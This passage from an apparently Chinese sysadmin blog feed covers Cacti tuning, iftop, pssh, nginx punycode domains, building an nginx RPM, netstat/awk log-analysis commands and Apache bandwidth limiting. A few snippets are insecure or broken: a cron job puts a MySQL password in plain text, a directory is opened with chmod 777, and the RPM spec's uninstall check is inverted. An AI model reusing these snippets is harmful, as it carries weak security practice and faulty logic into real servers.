class="line">CREATE INDEX `host_id_snmp_query_id_snmp_index` ON host_snmp_cache (`host_id`,`snmp_query_id`,`snmp_index`);</div><div class="line">CREATE INDEX `local_data_id_rrd_path` ON poller_item (`local_data_id`,`rrd_path`);</div><div class="line">CREATE INDEX `host_id_rrd_next_step` ON poller_item (`host_id`,`rrd_next_step`);</div><div class="line">CREATE INDEX host_id_snmp_query_id ON host_snmp_cache (host_id,snmp_query_id);</div><div class="line">CREATE INDEX host_id_snmp_port ON poller_item (host_id,snmp_port);</div><div class="line">CREATE INDEX data_source_path ON data_template_data (data_source_path);</div><div class="line">show index from table； 查看索引</div></pre></td></tr></table></figure>
<h4 id="重构RRA文件"><a href="#重构RRA文件" class="headerlink" title="重构RRA文件"></a>重构RRA文件</h4><p>首先在crontab里禁用poller.php，然后执行cacti_install_dir/cli目录下的 structure_rra_paths.php，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php  structure_rra_paths.php --proceed</div></pre></td></tr></table></figure>
<p>它会将所有的RRD文件按照device重新分配目录，并修改<strong>数据库</strong>中的RRD路径，成功执行后，再恢复poller.php的crontab就可以了。<br>按照上面3个步骤，710台服务器，24000个RRD文件，完成一次poller.php的时间，缩短到50 seconds。实现了最初的目的。</p>
<h4 id="TODO"><a href="#TODO" class="headerlink" title="TODO:"></a>TODO:</h4><p>在执行poller.php的时候, 监控服务器的load达到了3，通过vmstat查看，显示负载主要在I/O。在目前的情况，如果再出现瓶颈，可以考虑安装Boost插件来进一步提供性能。</p>
<p>cacti主要通过snmp来采集数据，可以引入collected等客户端，提供数据采集的可靠性。</p>
<p>使用spine替代默认的cmd.php来采集数据 见上一章</p>
<h5 id="使用Spine"><a href="#使用Spine" class="headerlink" title="使用Spine"></a>使用Spine</h5><p>关于spine插件的安装，这里就不讲了<br>访问：<a href="http://cacti_host_ipaddress/cacti" target="_blank" rel="external">http://cacti_host_ipaddress/cacti</a><br>Settings -&gt; Paths -&gt; “Spine Poller File Path” -&gt; spine程序的位置<br>Settings -&gt; Poller -&gt; “Poller Type” -&gt; spine</p>
<h5 id="进程调整"><a href="#进程调整" class="headerlink" title="进程调整"></a>进程调整</h5><p>对于进程和线程的调整有利于缩短采集时间，可以进行大量的采集。在CU论坛上看有人说cacti能够同时采集1k服务，这样的性能没有测试过，但是有人测试过同时采集200台服务器的，占用的内容只有几百兆，cpu的利用率也很低，说明一台的普通的机器排除网络链路延时采集的性能是相当强悍的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Settings -&gt; Poller -&gt; &quot;Maximum Concurrent Poller Processes&quot;（最大并发轮询器进程），修改该值</div><div class="line">Settings -&gt; Poller -&gt; &quot;Maximum Threads per Process&quot;（每进程最大线程数），修改该值</div><div class="line">Settings -&gt; Poller -&gt; &quot;Number of PHP Script Servers&quot;（PHP脚本服务程序数），修改该值</div><div class="line">通过修改这三个参数，可以提高一部分的性能</div></pre></td></tr></table></figure>
<h5 id="优化PHP内存"><a href="#优化PHP内存" class="headerlink" title="优化PHP内存"></a>优化PHP内存</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi /etc/php.ini</div><div class="line">memory_limit = 256M （预设是128MB，根据内存的使用情况，可以改大一点）</div></pre></td></tr></table></figure>
<h5 id="定期优化Cacti库"><a href="#定期优化Cacti库" class="headerlink" title="定期优化Cacti库"></a>定期优化Cacti库</h5><p>cacti 的 poller_output 会不明原因的长大，大到数据越写越慢，直到无法更新。每隔一段时间手动 “Truncate poller_output table” 后，就会继续正常运作；所以我们可以利用crontab定期清除数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vi /etc/cron.d/truncate_poller</div><div class="line">0 0 * * 0  root  /usr/local/mysql/bin/mysql --user=cacti --password=2010 cacti -e ‘truncate table poller_output;’</div><div class="line">#chkconfig --level 3 crond on &amp;amp;&amp;amp; service crond start</div></pre></td></tr></table></figure>
<h5 id="修改mysql的最大连接数"><a href="#修改mysql的最大连接数" class="headerlink" title="修改mysql的最大连接数"></a>修改mysql的最大连接数</h5><p>一般默认安装的时候没有调整最大连接数的话，当需要并发量的时候可以出图就会断断续续的<br>mysql&gt; set GLOBAL max_connections=2000；<br>或者直接修改my.cnf配置文件，增加：max_connections = 2000；</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux流量监控工具iftop]]></title>
      <url>/2013/03/31/linux-monitor-iftop.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>在类Unix系统中可以使用top查看系统资源、进程、内存占用等信息。查看网络状态可以使用netstat、nmap等工具。若要查看实时的网络流量，监控TCP/IP连接等，则可以使用<a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>。</p>
</blockquote>
<h4 id="一、iftop是什么？"><a href="#一、iftop是什么？" class="headerlink" title="一、iftop是什么？"></a>一、iftop是什么？</h4><p><a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>是类似于top的实时流量监控工具。</p>
<p>官方网站：<a href="http://www.ex-parrot.com/~pdw/iftop/" target="_blank" rel="external">http://www.ex-parrot.com/~pdw/iftop/</a></p>
<h4 id="二、iftop有什么用？"><a href="#二、iftop有什么用？" class="headerlink" title="二、iftop有什么用？"></a>二、iftop有什么用？</h4><p><a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>可以用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等，详细的将会在后面的使用参数中说明。<img src="http://www.vpser.net/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" title="更多..."></p>
<h4 id="三、安装iftop"><a href="#三、安装iftop" class="headerlink" title="三、安装iftop"></a>三、安装iftop</h4><p><strong>安装方法1、</strong>编译安装</p>
<p>如果采用编译安装可以到<a href="http://www.ex-parrot.com/~pdw/iftop/" target="_blank" rel="external">iftop官网</a>下载最新的源码包。</p>
<p>安装前需要已经安装好基本的编译所需的环境，比如make、gcc、autoconf等。安装iftop还需要安装libpcap和libcurses。</p>
<p><strong>CentOS上安装所需依赖包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install flex byacc  libpcap ncurses ncurses-devel</div></pre></td></tr></table></figure></p>
<p><strong>Debian上安装所需依赖包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install flex byacc  libpcap0.8 libncurses5</div></pre></td></tr></table></figure></p>
<p>下载iftop</p>
<p>wget <a href="http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz" target="_blank" rel="external">http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz</a><br>tar zxvf iftop-0.17.tar.gz<br>cd iftop-0.17<br>./configure<br>make &amp;&amp; make install</p>
<p><strong>安装方法2：(懒人办法，最简单)</strong></p>
<p>直接省略上面的步骤</p>
<p>CentOS系统运行：yum install iftop<br>Debian系统 运行：apt-get install iftop</p>
<h4 id="四、运行iftop"><a href="#四、运行iftop" class="headerlink" title="四、运行iftop"></a>四、运行iftop</h4><p>直接运行： iftop<br>效果如下图：</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2013/03/iftop-interface.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/03/iftop-interface.jpg" alt="iftop-interface"></a></p>
<h4 id="五、相关参数及说明"><a href="#五、相关参数及说明" class="headerlink" title="五、相关参数及说明"></a>五、相关参数及说明</h4><p>1、iftop界面相关说明<br>界面上面显示的是类似刻度尺的刻度范围，为显示流量图形的长条作标尺用的。</p>
<p>中间的&lt;= =&gt;;这两个左右箭头，表示的是流量的方向。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">TX：发送流量</div><div class="line">RX：接收流量</div><div class="line">TOTAL：总流量</div><div class="line">Cumm：运行iftop到目前时间的总流量</div><div class="line">peak：流量峰值</div><div class="line">rates：分别表示过去 2s 10s 40s 的平均流量</div></pre></td></tr></table></figure></p>
<p>2、iftop相关参数</p>
<p>常用的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-i设定监测的网卡，如：# iftop -i eth1</div><div class="line">-B 以bytes为单位显示流量(默认是bits)，如：# iftop -B</div><div class="line">-n使host信息默认直接都显示IP，如：# iftop -n</div><div class="line">-N使端口信息默认直接都显示端口号，如: # iftop -N</div><div class="line">-F显示特定网段的进出流量，如# iftop -F 10.10.1.0/24或# iftop -F 10.10.1.0/255.255.255.0</div><div class="line">-h（display this message），帮助，显示参数信息</div><div class="line">-p使用这个参数后，中间的列表显示的本地主机信息，出现了本机以外的IP信息;</div><div class="line">-b使流量图形条默认就显示;</div><div class="line">-f这个暂时还不太会用，过滤计算包用的;</div><div class="line">-P使host信息及端口信息默认就都显示;</div><div class="line">-m设置界面最上边的刻度的最大值，刻度分五个大段显示，例：# iftop -m 100M</div></pre></td></tr></table></figure></p>
<p>进入iftop画面后的一些操作命令(注意大小写)<br>```<br>按h切换是否显示帮助;<br>按n切换显示本机的IP或主机名;<br>按s切换是否显示本机的host信息;<br>按d切换是否显示远端目标主机的host信息;<br>按t切换显示格式为2行/1行/只显示发送流量/只显示接收流量;<br>按N切换显示端口号或端口服务名称;<br>按S切换是否显示本机的端口信息;<br>按D切换是否显示远端目标主机的端口信息;<br>按p切换是否显示端口信息;<br>按P切换暂停/继续显示;<br>按b切换是否显示平均流量图形条;<br>按B切换计算2秒或10秒或40秒内的平均流量;<br>按T切换是否显示每个连接的总流量;<br>按l打开屏幕过滤功能，输入要过滤的字符，比如ip,按回车后，屏幕就只显示这个IP相关的流量信息;<br>按L切换显示画面上边的刻度;刻度不同，流量图形条会有变化;<br>按j或按k可以向上或向下滚动屏幕显示的连接记录;<br>按1或2或3可以根据右侧显示的三列流量数据进行排序;<br>按&lt;根据左边的本机名或IP排序;<br>按&gt;根据远端目标主机的主机名或IP排序;<br>按o切换是否固定只显示当前的连接;<br>按f可以编辑过滤代码，这是翻译过来的说法，我还没用过这个！<br>按!可以使用shell命令，这个没用过！没搞明白啥命令在这好用呢！<br>按q退出监控。</p>
<h4 id="六、常见问题"><a href="#六、常见问题" class="headerlink" title="六、常见问题"></a>六、常见问题</h4><p>1、make: yacc: Command not found<br>make: <em>*</em> [grammar.c] Error 127</p>
<p>解决方法：apt-get install byacc   /   yum install byacc</p>
<p>2、configure: error: Curses! Foiled again!<br>(Can’t find a curses library supporting mvchgat.)<br>Consider installing ncurses.</p>
<p>解决方法：apt-get install libncurses5-dev  /    yum  install ncurses-devel</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PSSH 批量管理服务器]]></title>
      <url>/2013/03/01/pssh-try-install-usage.html</url>
      <content type="html"><![CDATA[<p>想找一个轻量的批量管理机器的工具，网上搜了一下发现有介绍pssh这个工具，用python写的，python版本大于2.4即可，于是下载试了一下。</p>
<p>1 下载wget </p>
<p><a href="http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz" target="_blank" rel="external">http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz</a></p>
<p>2 安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">tar zxvf pssh-2.3.1.tar.gz    </div><div class="line">cd pssh-2.3.1/    </div><div class="line">python setup.py install    </div><div class="line">chmod 755 /usr/local/bin/pnuke </div><div class="line">chmod 755 /usr/local/bin/pscp  </div><div class="line">chmod 755 /usr/local/bin/pslurp</div><div class="line">chmod 755 /usr/local/bin/pssh  </div><div class="line">chmod 755 /usr/local/bin/pssh-askpass    </div><div class="line">chmod 755 /usr/local/bin/prsync</div></pre></td></tr></table></figure>
<p>3 介绍pssh参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-h 执行命令的远程主机列表或者 -H user@ip:port 文件内容格式[user@]host[:port]</div><div class="line">-l 远程机器的用户名</div><div class="line">-p 一次最大允许多少连接</div><div class="line">-o 输出内容重定向到一个文件</div><div class="line">-e 执行错误重定向到一个文件</div><div class="line">-t 设置命令执行的超时时间</div><div class="line">-A 提示输入密码并且把密码传递给ssh</div><div class="line">-O 设置ssh参数的具体配置，参照ssh_config配置文件</div><div class="line">-x 传递多个SSH 命令，多个命令用空格分开，用引号括起来</div><div class="line">-X 同-x 但是一次只能传递一个命令</div><div class="line">-i 显示标准输出和标准错误在每台host执行完毕后</div><div class="line">-I 读取每个输入命令，并传递给ssh进程 允许命令脚本传送到标准输入</div></pre></td></tr></table></figure>
<p>4 介绍软件包内其他命令</p>
<p>pscp 传输文件到多个hosts，他的特性和scp差不多<br>pslurp 从多台远程机器拷贝文件<br>pnuke kill远程机器的进程</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx配置中文域名]]></title>
      <url>/2013/01/22/nginx-chinese-domain.html</url>
      <content type="html"><![CDATA[<p>当在浏览器中敲入www.明月博客.com时，浏览器会转为www.xn–9kRq6Qw2Iu2A.com<br>其实中文域名就是一个经过编码的英文域名（中文域名–&gt;punycode编码–&gt;英文域名）<br>在线转换地址<a href="http://www.webmasterhome.cn/tool/punycode.asp" target="_blank" rel="external">http://www.webmasterhome.cn/tool/punycode.asp</a><br>配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">listen 80;   </div><div class="line">server_name www.xn--9kRq6Qw2Iu2A.com;   </div><div class="line">index index.html;</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[简单介绍RPM包制作方法]]></title>
      <url>/2012/12/16/rpm-package.html</url>
      <content type="html"><![CDATA[<p>“<br>RPM是RedHat Package Manager（RedHat软件包管理工具）的缩写,是一种用于互联网下载包的打包及安装工具，它包含在某些Linux分发版中。它生成具有.RPM扩展名的文件。使用rpm安装软件和管理软件非常的方便。而这节我们不是介绍如何使用rpm安装或管理软件，而是如何把源码制作成rpm包。<br>“<br>下面我们以制作nginx的rpm开始介绍其制作方法。以下操作在centos-5 32系统进行。<br>制作nginx的rpm例子</p>
<h4 id="建立目录结构"><a href="#建立目录结构" class="headerlink" title="建立目录结构"></a>建立目录结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">/usr/src/redhat/SOURCES — 存放源代码，补丁，图标等文件。</div><div class="line">/usr/src/redhat/SPECS — 存放用于管理rpm制作进程的spec文件。</div><div class="line">/usr/src/redhat/BUILD — 解压后的文件存放在这里。</div><div class="line">/usr/src/redhat/RPMS — 存放由rpmbuild制作好的二进制包。</div><div class="line">/usr/src/redhat/SRPMS —存放由rpmbuild制作好的源码包。</div><div class="line"></div><div class="line">mkdir -p /usr/src/redhat</div><div class="line">cd /usr/src/redhat</div><div class="line">mkdir SOURCES SPECS BUILD RPMS SRPMS</div></pre></td></tr></table></figure>
<h4 id="下载源码包"><a href="#下载源码包" class="headerlink" title="下载源码包"></a>下载源码包</h4><p>下载源码包到SOURCES目录，不需要解压。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /usr/src/redhat/SOURCES</div><div class="line">wget http://nginx.org/download/nginx-1.2.1.tar.gz</div></pre></td></tr></table></figure></p>
<h4 id="创建Spec文件"><a href="#创建Spec文件" class="headerlink" title="创建Spec文件"></a>创建Spec文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">cd /usr/src/redhat/SPECS</div><div class="line">vi nginx.spec</div><div class="line">内容如下：</div><div class="line"></div><div class="line">#</div><div class="line"># Example spec file for nginx</div><div class="line">#</div><div class="line">Summary: high performance web server</div><div class="line">Name: nginx</div><div class="line">Version: 1.2.1</div><div class="line">Release: 1.el5.ngx</div><div class="line">License: 2-clause BSD-like license</div><div class="line">Group: Applications/Server</div><div class="line">Source: http://nginx.org/download/nginx-1.2.1.tar.gz</div><div class="line">URL: http://nginx.org/</div><div class="line">Distribution: Linux</div><div class="line">Packager: geekwolf &lt;admin@simlinuxc.om&gt;;</div><div class="line"></div><div class="line">%description</div><div class="line">nginx [engine x] is a HTTP and reverse proxy server, as well as</div><div class="line">a mail proxy server</div><div class="line">%prep</div><div class="line">rm -rf $RPM_BUILD_DIR/nginx-1.2.1</div><div class="line">zcat $RPM_SOURCE_DIR/nginx-1.2.1.tar.gz | tar -xvf -</div><div class="line">%build</div><div class="line">cd nginx-1.2.1</div><div class="line">./configure --prefix=/usr/local/nginx</div><div class="line">make</div><div class="line">%install</div><div class="line">cd nginx-1.2.1</div><div class="line">make install</div><div class="line">%preun</div><div class="line">if [ -z &quot;`ps aux | grep nginx | grep -v grep`&quot; ];then</div><div class="line">killall nginx &gt;/dev/null</div><div class="line">exit 0</div><div class="line">fi</div><div class="line">%files</div><div class="line">/usr/local/nginx</div></pre></td></tr></table></figure>
<h4 id="开始RPM制作"><a href="#开始RPM制作" class="headerlink" title="开始RPM制作"></a>开始RPM制作</h4><p>在制作RPM包之前需要安装必要的工具，如rpmbuild,gcc等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yum install gcc rpm-build pcre-devel</div><div class="line">cd /usr/src/redhat/SPECS/</div><div class="line">rpmbuild -bb nginx.spec</div><div class="line">一切顺利的话，会生成nginx的rpm包，/usr/src/redhat/RPMS/i386/nginx-1.2.1-1.el5.ngx.i386.rpm。</div></pre></td></tr></table></figure></p>
<h4 id="测试rpm包"><a href="#测试rpm包" class="headerlink" title="测试rpm包"></a>测试rpm包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">rpm -ivh /usr/src/redhat/RPMS/i386/nginx-1.2.1-1.el5.ngx.i386.rpm</div><div class="line">spec文件解释</div><div class="line">从以上的简单例子可以看出，制作rpm包最重要的还是spec文件，下面解释一下例子所用到的指令。</div><div class="line">#:以#开头是注释，rpm会忽略它。</div><div class="line">Summary：简单描述软件。</div><div class="line">Name ：定义rpm的名称。</div><div class="line">Version: 定义软件版本</div><div class="line">Release: 发行版本</div><div class="line">License: 定义许可证</div><div class="line">Group: 软件分类</div><div class="line">Source: 源码下载地址</div><div class="line">URL: 源码相关网站</div><div class="line">Distribution: 发行版系列</div><div class="line">Packager: 打包人的信息</div><div class="line"></div><div class="line">%description:软件详细描述，可多行</div><div class="line">%prep ：软件编译之前的处理，如解压。</div><div class="line">%build ：开始编译软件，如make</div><div class="line">%install :开始安装软件，如make install</div><div class="line">%files :指定哪些文件需要被打包，如/usr/local/nginx</div><div class="line">%preun :定义卸载之前的动作，如杀掉进程。</div><div class="line">这里只介绍了几个常用的tag，更详细的请参考：http://www.rpm.org/max-rpm/ch-rpm-inside.html</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[系统管理及debug常用命令]]></title>
      <url>/2012/12/16/linux-often-use.html</url>
      <content type="html"><![CDATA[<p>系统连接状态篇：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">1. 查看TCP连接状态 netstat -nat |awk &apos;&#123;print $6&#125;&apos;|sort|uniq -c|sort -rn</div><div class="line">netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125;;END &#123;for(a in S) print a, S[a]&#125;&apos; 或 netstat -n | awk &apos;/^tcp/ &#123;++state[$NF]&#125;; END &#123;for(key in state) print key,&quot;t&quot;,state[key]&#125;&apos; netstat -n | awk &apos;/^tcp/ &#123;++arr[$NF]&#125;;END &#123;for(k in arr) print k,&quot;t&quot;,arr[k]&#125;&apos;</div><div class="line">netstat -n |awk &apos;/^tcp/ &#123;print $NF&#125;&apos;|sort|uniq -c|sort -rn</div><div class="line">netstat -ant | awk &apos;&#123;print $NF&#125;&apos; | grep -v &apos;[a-z]&apos; | sort | uniq -c</div><div class="line">2. 查找请求数请20个IP（常用于查找攻来源）： netstat -anlp|grep 80|grep tcp|awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -n20</div><div class="line">netstat -ant |awk &apos;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&apos; |sort -rn|head -n20</div><div class="line">3. 用tcpdump嗅探80端口的访问看看谁最高 tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -nr |head -20</div><div class="line">4. 查找较多time_wait连接 netstat -n|grep TIME_WAIT|awk &apos;&#123;print $5&#125;&apos;|sort|uniq -c|sort -rn|head -n20</div><div class="line">5. 找查较多的SYN连接 netstat -an | grep SYN | awk &apos;&#123;print $5&#125;&apos; | awk -F: &apos;&#123;print $1&#125;&apos; | sort | uniq -c | sort -nr | more</div><div class="line">6. 根据端口列进程 netstat -ntlp | grep 80 | awk &apos;&#123;print $7&#125;&apos; | cut -d/ -f1</div></pre></td></tr></table></figure></p>
<p>网站日志分析篇1（Apache）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1. 获得访问前10位的ip地址 cat access.log|awk &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -10 cat access.log|awk &apos;&#123;counts[$(11)]+=1&#125;; END &#123;for(url in counts) print counts[url], url&#125;&apos;</div><div class="line">2. 访问次数最多的文件或页面,取前20 cat access.log|awk &apos;&#123;print $11&#125;&apos;|sort|uniq -c|sort -nr|head -20</div><div class="line">3. 列出传输最大的几个exe文件（分析下载站的时候常用） cat access.log |awk &apos;($7~/.exe/)&#123;print $10 &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&apos;|sort -nr|head -20</div><div class="line">4. 列出输出大于200000byte(约200kb)的exe文件以及对应文件发生次数 cat access.log |awk &apos;($10 &gt; 200000 &amp;&amp; $7~/.exe/)&#123;print $7&#125;&apos;|sort -n|uniq -c|sort -nr|head -100</div><div class="line">5. 如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面 cat access.log |awk  &apos;($7~/.php/)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&apos;|sort -nr|head -100</div><div class="line">6. 列出最最耗时的页面(超过60秒的)的以及对应页面发生次数 cat access.log |awk &apos;($NF &gt; 60 &amp;&amp; $7~/.php/)&#123;print $7&#125;&apos;|sort -n|uniq -c|sort -nr|head -100</div><div class="line">7. 列出传输时间超过 30 秒的文件 cat access.log |awk &apos;($NF &gt; 30)&#123;print $7&#125;&apos;|sort -n|uniq -c|sort -nr|head -20</div><div class="line">8. 统计网站流量（G) cat access.log |awk &apos;&#123;sum+=$10&#125; END &#123;print sum/1024/1024/1024&#125;&apos;</div><div class="line">9. 统计404的连接 awk &apos;($9 ~/404/)&apos; access.log | awk &apos;&#123;print $9,$7&#125;&apos; | sort</div><div class="line">10. 统计http status. cat access.log |awk &apos;&#123;counts[$(9)]+=1&#125;; END &#123;for(code in counts) print code, counts[code]&#125;&apos; cat access.log |awk &apos;&#123;print $9&#125;&apos;|sort|uniq -c|sort -rn</div><div class="line">10.蜘蛛分析 查看是哪些蜘蛛在抓取内容。 /usr/sbin/tcpdump -i eth0 -l -s 0 -w - dst port 80 | strings | grep -i user-agent | grep -i -E &apos;bot|crawler|slurp|spider&apos;</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache模块之mod_bandwidth带宽限制]]></title>
      <url>/2012/12/11/apache-mod_bandwidth.html</url>
      <content type="html"><![CDATA[<h4 id="下载模块-mod-bandwidth"><a href="#下载模块-mod-bandwidth" class="headerlink" title="下载模块 mod_bandwidth"></a>下载模块 mod_bandwidth</h4><p><a href="ftp://ftp.cohprog.com/pub/apache/module/" target="_blank" rel="external">ftp://ftp.cohprog.com/pub/apache/module/</a></p>
<h4 id="编译和安装"><a href="#编译和安装" class="headerlink" title="编译和安装"></a>编译和安装</h4><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>由于 apache 是用编译好的包安装的，因此只有采用 apxs 方式编译<br>/usr/local/sbin/apxs -c mod_bandwidth.c -o /usr/local/libexec/apache/mod_bandwidth.so</p>
<h5 id="创建-mod-bandwidth-运行需要的目录"><a href="#创建-mod-bandwidth-运行需要的目录" class="headerlink" title="创建 mod_bandwidth 运行需要的目录"></a>创建 mod_bandwidth 运行需要的目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /tmp/apachebw</div><div class="line">mkdir /tmp/apachebw/link</div><div class="line">mkdir /tmp/apachebw/master</div><div class="line">chmod -R 777 /tmp/apachebw</div></pre></td></tr></table></figure>
<h5 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h5><p>/usr/local/etc/apache/httpd.conf：<br>增加下列内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LoadModule bandwidth_module   libexec/apache/mod_bandwidth.so</div><div class="line">AddModule mod_bandwidth.c</div></pre></td></tr></table></figure>
<p>注意：这两行必须分别加在相应区域的最前面，使得这个模块以最低的优先级运行。</p>
<p>增加下列内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">BandWidthDataDir &quot;/tmp/apachebw/&quot;</div><div class="line">BandWidthModule on</div></pre></td></tr></table></figure>
<p>修改设置</p>
<p>不限制局域网内用户的下载速度<br>BandWidth 192.168.0 0<br>限制其他用户的下载速度为每秒 8192 字节<br>BandWidth all 8192<br>….</p>
<h5 id="重新启动-apache"><a href="#重新启动-apache" class="headerlink" title="重新启动 apache"></a>重新启动 apache</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apachectl configtest</div><div class="line">apachectl restart</div></pre></td></tr></table></figure>
